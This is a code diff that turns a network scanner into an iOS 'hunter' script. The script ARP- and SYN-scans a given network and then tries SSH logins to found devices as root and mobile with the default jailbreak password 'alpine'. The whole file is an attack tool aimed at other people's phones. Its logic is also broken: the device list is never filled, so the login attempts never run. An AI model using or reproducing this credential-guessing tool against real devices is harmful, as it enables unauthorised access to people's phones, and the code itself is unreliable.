@@ -1,98 +1,73 @@
 #!/usr/bin/env python
 # -*- encoding: utf-8 -*-
-#
+# Dummy iOS hunter searches jailbroken devices with alpine password
 
 __author__ = '090h'
 __license__ = 'GPL'
 
+# import scapy silently
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+from scapy.all import *
+conf.verb = 0
 
-from libnmap.process import NmapProcess
-from libnmap.parser import NmapParser, NmapParserException
-from time import sleep
-from pprint import pprint
-from netifaces import ifaddresses
-from arp import scan, ping, arp_summary
+from sys import argv
+import paramiko
 
-# nmap_proc = NmapProcess(targets="scanme.nmap.org", options="-sT")
-# nmap_proc.run_background()
-# while nmap_proc.is_running():
-#     print("Nmap Scan running: ETC: {0} DONE: {1}%".format(nmap_proc.etc,
-#                                                           nmap_proc.progress))
-#     sleep(2)
-#
-# print("rc: {0} output: {1}".format(nmap_proc.rc, nmap_proc.summary))
+# def icmp_ping(host):
+#     ans,unans=sr(IP(dst=host)/ICMP())
+#     # Information on live hosts can be collected with the following request:
+#     ans.summary(lambda (s, r): r.sprintf("%IP.src% is alive"))
 
 
-# start a new nmap scan on localhost with some specific options
-def do_scan(targets, options):
-    parsed = None
-    nmproc = NmapProcess(targets, options)
-    rc = nmproc.run()
-    if rc != 0:
-        print("nmap scan failed: {0}".format(nmproc.stderr))
-    # print(type(nmproc.stdout))
-
+def ssh_auth(host, port, user, password):
     try:
-        parsed = NmapParser.parse(nmproc.stdout)
-    except NmapParserException as e:
-        print("Exception raised while parsing scan: {0}".format(e.msg))
+        ssh = paramiko.SSHClient()
+        ssh.load_system_host_keys()
+        ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
+        print("Try: " + host)
+        ssh.connect(hostname=host,port=port, username=user, password=password)
+        print("Correct: "+ password)
+        ssh.close()
+        return True
+    except paramiko.AuthenticationException, error:
+        print("Invarid : "+ password)
+    except socket.error, error:
+        print error
+    except paramiko.SSHException, error:
+        print error
+    except Exception, error:
+        print str(error)
+    finally:
+        if not ssh is None:
+            ssh.close()
+    return False
 
 
-    return parsed
+def syn_scan(host, port):
+    '''SYN scan'''
+
+    ans, unans = sr(IP(dst=host)/TCP(flags="S", dport=port))
+    # Possible result visualization: open ports
+    ans.nsummary(lfilter=lambda (s, r): (r.haslayer(TCP) and (r.getlayer(TCP).flags & 2)))
+    return ans
 
 
-# print scan results from a nmap report
-def print_scan(nmap_report):
-    for host in nmap_report.hosts:
-        if len(host.hostnames):
-            tmp_host = host.hostnames.pop()
-        else:
-            tmp_host = host.address
-
-        print("Nmap scan report for {0} ({1})".format(
-            tmp_host,
-            host.address))
-        print("Host is {0}.".format(host.status))
-        print("  PORT     STATE         SERVICE")
-
-        for serv in host.services:
-            pserv = "{0:>5s}/{1:3s}  {2:12s}  {3}".format(
-                    str(serv.port),
-                    serv.protocol,
-                    serv.state,
-                    serv.service)
-            if len(serv.banner):
-                pserv += " ({0})".format(serv.banner)
-            print(pserv)
-    print(nmap_report.summary)
-
-def search_ios_devices(iprange):
-    nmap_report = do_scan(iprange, "-sV -p 62078")
+def hack_ios_devices(host):
+    print("ARP discovery... %s" % host)
+    ans, unans = arping(host)
+    ans.summary(lambda (s, r): r.sprintf("%Ether.src% %ARP.psrc%") )
+    print('SYN scan')
+    res = syn_scan(host, port=(22,62078))
 
     devices = []
-    for host in filter(lambda host: host.status != 'down', nmap_report.hosts):
-        tmp_host = host.hostnames.pop() if len(host.hostnames) else host.address
-
-        for serv in host.services:
-            if serv.state == 'open':
-                devices.append(host.address)
-
-            # pserv = "{0:>5s}/{1:3s}  {2:12s}  {3}".format(
-            #         str(serv.port),
-            #         serv.protocol,
-            #         serv.state,
-            #         serv.service)
-            # if len(serv.banner):
-            #     pserv += " ({0})".format(serv.banner)
-            # print(tmp_host, pserv)
-    return devices
-
+    for device in devices:
+        ssh_auth(device, 22, 'root', 'alpine')
+        ssh_auth(device, 22, 'mobile', 'alpine')
 
 if __name__ == '__main__':
-    lan = "10.0.0.1/24"
-    print("ARP Scanning %s" % lan)
-    # pprint(ping(lan))
-    arp_summary(lan)
+    if len(argv) == 1:
+        print('Usage:\n\t./ioshunter.py <network>')
+    else:
+        hack_ios_devices(argv[1])
 
-    print('NMap scan')
-    pprint(search_ios_devices(lan))
